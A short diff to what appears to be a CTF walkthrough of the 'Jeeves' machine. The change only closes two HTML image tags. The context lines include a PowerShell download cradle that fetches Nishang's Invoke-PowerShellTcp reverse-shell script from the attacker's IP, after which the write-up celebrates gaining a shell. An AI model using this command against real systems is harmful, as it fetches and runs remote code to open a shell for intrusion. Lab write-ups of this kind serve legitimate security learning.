@@ -106,10 +106,10 @@ Powershell script to download the nishang script (might be useful for future mac
 (New-Object Net.WebClient).downloadString('http://10.10.14.36/Invoke-PowerShellTcp.ps1')
 ```
 
-<img src="{{ site.url }}{{ site.baseurl }}/assets/images/jeeves/power-console.png" alt="power-console"
+<img src="{{ site.url }}{{ site.baseurl }}/assets/images/jeeves/power-console.png" alt="power-console">
 
 So, wollah!
 
-<img src="{{ site.url }}{{ site.baseurl }}/assets/images/jeeves/shell-gif.gif" alt="shell-gif"
+<img src="{{ site.url }}{{ site.baseurl }}/assets/images/jeeves/shell-gif.gif" alt="shell-gif">
 
 
